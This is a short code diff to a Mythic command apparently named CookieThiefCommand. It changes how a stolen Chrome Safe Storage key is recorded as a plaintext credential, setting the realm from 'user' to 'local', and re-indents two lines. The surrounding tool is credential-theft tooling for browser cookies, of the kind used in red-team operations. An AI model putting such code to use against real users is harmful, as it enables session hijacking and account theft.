@@ -130,10 +130,10 @@ class CookieThiefCommand(CommandBase):
         cred = mythic_rest.Credential(type="plaintext",
                                       account="Chrome Safe Storage",
                                       credential=ccs_password,
-                                      realm="user",
+                                      realm="local",
                                       comment="User Chrome Safe Storage Key")
-        ccs_resp = await mythic.create_credential(cred)
-        await mythic_rest.json_print(ccs_resp)
+            ccs_resp = await mythic.create_credential(cred)
+            await mythic_rest.json_print(ccs_resp)
 
 
 
